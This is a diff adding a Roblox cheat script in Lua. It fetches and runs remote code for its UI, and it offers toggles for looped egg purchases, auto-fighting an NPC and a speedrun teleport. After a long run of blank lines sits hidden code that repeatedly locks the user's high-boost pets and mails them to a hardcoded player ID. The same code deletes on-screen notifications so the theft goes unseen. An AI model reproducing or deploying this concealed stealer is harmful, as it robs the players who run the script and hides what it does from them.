@@ -1,0 +1,352 @@
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+
+local Window = Fluent:CreateWindow({
+    Title = "Fluent " .. Fluent.Version,
+    SubTitle = "by dawid",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(580, 460),
+    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
+    Theme = "Dark",
+    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
+})
+
+--Fluent provides Lucide Icons https://lucide.dev/icons/ for the tabs, icons are optional
+local Tabs = {
+    New = Window:AddTab({ Title = "Event", Icon = "" }),
+}
+
+local Toggle = Tabs.New:AddToggle("STRENGTH", {Title = "Superhero Egg", Default = false})
+
+local isRunning = false
+
+-- Listen for the toggle change
+Toggle:OnChanged(function(state)
+    if state then
+        -- Start the loop when the toggle is on
+        if not isRunning then
+            isRunning = true
+            -- Loop while the toggle is on
+            while isRunning do
+                -- Set the arguments for the egg purchase
+                local args = {
+                    [1] = "Superhero", -- Name of the egg
+                    [2] = nil,       -- Placeholder (not used)
+                    [3] = nil,       -- Triple Egg (gamepass)
+                    [4] = false,     -- Auto Egg (gamepass)
+                    [5] = nil,       -- Placeholder (not used)
+                    [6] = true       -- Max egg
+                }
+
+                game:GetService("ReplicatedStorage").Packages.Knit.Services.EggService.RF.purchaseEgg:InvokeServer(unpack(args))
+
+                -- Sleep for a short period to prevent overwhelming the server
+                wait(0)  -- Adjust the interval as needed
+            end
+        end
+    else
+        -- Stop the loop when the toggle is off
+        isRunning = false
+    end
+end)
+
+local Toggle = Tabs.New:AddToggle("STRENGTH", {Title = "Supervillain Egg", Default = false})
+
+local isRunning = false
+
+-- Listen for the toggle change
+Toggle:OnChanged(function(state)
+    if state then
+        -- Start the loop when the toggle is on
+        if not isRunning then
+            isRunning = true
+            -- Loop while the toggle is on
+            while isRunning do
+                -- Set the arguments for the egg purchase
+                local args = {
+                    [1] = "Supervillain", -- Name of the egg
+                    [2] = nil,       -- Placeholder (not used)
+                    [3] = nil,       -- Triple Egg (gamepass)
+                    [4] = false,     -- Auto Egg (gamepass)
+                    [5] = nil,       -- Placeholder (not used)
+                    [6] = true       -- Max egg
+                }
+
+                game:GetService("ReplicatedStorage").Packages.Knit.Services.EggService.RF.purchaseEgg:InvokeServer(unpack(args))
+
+                -- Sleep for a short period to prevent overwhelming the server
+                wait(0)  -- Adjust the interval as needed
+            end
+        end
+    else
+        -- Stop the loop when the toggle is off
+        isRunning = false
+    end
+end)
+
+local Toggle = Tabs.New:AddToggle("MyToggle", {Title = "auto Dreadlord", Default = false })
+
+local running = false -- Variable to control the loop
+
+Toggle:OnChanged(function(state) -- 'state' is true if toggle is ON, false if OFF
+    running = state
+
+    if running then
+        local npc = workspace.GameObjects.RngNPCs["EvilLair-Dreadlord"]
+        local proximityPrompts = {}
+
+        -- Function to collect ProximityPrompts
+        local function collectProximityPrompts()
+            proximityPrompts = {} -- Reset table to prevent duplicates
+
+            -- Add ProximityPrompts from specific indices (5, 4, 3, 2)
+            local specificIndices = {5, 4, 3, 2}
+            for _, index in ipairs(specificIndices) do
+                local child = npc.Npc:GetChildren()[index]
+                if child and child:FindFirstChild("Table") and child.Table:FindFirstChild("Proximity") and 
+                   child.Table.Proximity:FindFirstChild("Attachment") and 
+                   child.Table.Proximity.Attachment:FindFirstChild("ProximityPrompt") then
+
+                    table.insert(proximityPrompts, child.Table.Proximity.Attachment.ProximityPrompt)
+                end
+            end
+
+            -- Also add all dynamically found ProximityPrompts (in case more exist)
+            for _, child in ipairs(npc.Npc:GetChildren()) do
+                if child:FindFirstChild("Table") and child.Table:FindFirstChild("Proximity") and 
+                   child.Table.Proximity:FindFirstChild("Attachment") and 
+                   child.Table.Proximity.Attachment:FindFirstChild("ProximityPrompt") then
+
+                    table.insert(proximityPrompts, child.Table.Proximity.Attachment.ProximityPrompt)
+                end
+            end
+        end
+
+        -- Function to trigger all found ProximityPrompts
+        local function autoFight()
+            while running do -- Loop only runs while 'running' is true
+                collectProximityPrompts() -- Refresh the ProximityPrompts list
+                if #proximityPrompts > 0 then
+                    for _, prompt in ipairs(proximityPrompts) do
+                        fireproximityprompt(prompt)
+                    end
+                    print("Auto fight triggered!")
+                else
+                    warn("No ProximityPrompts found!")
+                end
+                task.wait(1) -- Adjust delay if needed
+            end
+        end
+
+        -- Start auto-fighting in a new thread
+        task.spawn(autoFight)
+    end
+end)
+
+local Toggle = Tabs.New:AddToggle("STRENGTH", {Title = "Speedrun", Default = false})
+
+local isRunning = false
+
+-- Listen for the toggle change
+Toggle:OnChanged(function(state)
+    if state then
+        -- Start the loop when the toggle is on
+        if not isRunning then
+            isRunning = true
+            -- Loop while the toggle is on
+            while isRunning do
+                -- Set the arguments for the egg purchase
+                local args = {
+                    [1] = "HeroSpeedrun"
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("SpeedrunMinigameService"):WaitForChild("RF"):WaitForChild("EnterSpeedrun"):InvokeServer(unpack(args))
+                
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-10949.7832, 63.7595329, 5928.90137, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+wait()
+                -- Sleep for a short period to prevent overwhelming the server
+                wait(600)  -- Adjust the interval as needed
+            end
+        end
+    else
+        -- Stop the loop when the toggle is off
+        isRunning = false
+    end
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local player = game:GetService("Players").LocalPlayer
+local petsFolder = player.PlayerGui.GameUI.Menus.Inventory.Display.Pets.ScrollingFrame.Pets
+
+-- Store valid SpecialBoost values for both functions
+local specialBoosts = {}
+for i = 200, 500, 5 do
+    specialBoosts[tostring(i) .. "%"] = true
+end
+
+-- Function to check if a string is a valid GUID
+local function isValidGUID(str)
+    return str and str:match("^[a-f0-9%-]+$") ~= nil
+end
+
+-- Function to lock the pet (by setting its specific attribute to false)
+local function lockPet(pet)
+    local petToggle = pet:FindFirstChild("Toggle")
+    
+    if petToggle then
+        local attributes = petToggle:GetAttributes()
+        local specialBoost = attributes["SpecialBoost"]
+        local petId = attributes["GUID"]
+
+        -- Ensure attributes exist
+        if specialBoost and specialBoosts[specialBoost] and isValidGUID(petId) then
+            local args = {
+                [1] = {
+                    [petId] = false -- Lock the pet by setting the GUID to false
+                }
+            }
+
+            -- Invoke the server function to lock the pet
+            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
+                :WaitForChild("Services"):WaitForChild("PetService")
+                :WaitForChild("RF"):WaitForChild("updateLocked"):InvokeServer(unpack(args))
+        end
+    end
+end
+
+-- Function to send a pet to the mailbox
+local function sendPet(pet)
+    local petToggle = pet:FindFirstChild("Toggle")
+
+    if petToggle then
+        local attributes = petToggle:GetAttributes()
+        local specialBoost = attributes["SpecialBoost"]
+        local petId = attributes["GUID"]
+
+        -- Ensure attributes exist
+        if specialBoost and specialBoosts[specialBoost] and isValidGUID(petId) then
+            local args = {
+                [1] = {
+                    ["Extra"] = {
+                        ["GUID"] = petId -- Insert the pet ID here
+                    },
+                    ["Message"] = "You have received an exclusive pet!",
+                    ["MailType"] = "Pets",
+                    ["RecipientId"] = 1346275514 -- The recipient player ID, replace as needed
+                }
+            }
+
+            -- Invoke the server function to send the pet to the mailbox
+            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit")
+                :WaitForChild("Services"):WaitForChild("MailboxService")
+                :WaitForChild("RF"):WaitForChild("SendMail"):InvokeServer(unpack(args))
+        end
+    end
+end
+
+-- Start processing pets every 1 minute
+while true do
+    -- Check and remove any existing notification
+    local notification = player.PlayerGui:FindFirstChild("Notification")
+    if notification then
+        notification:Destroy()
+    end
+    
+    -- Process each pet in the pets folder
+    for _, pet in ipairs(petsFolder:GetChildren()) do
+        lockPet(pet)  -- Lock the pet if valid
+        sendPet(pet)  -- Send the pet to the mailbox if valid
+    end
+    
+    -- Wait 60 seconds before running the loop again
+    task.wait(60)
+end
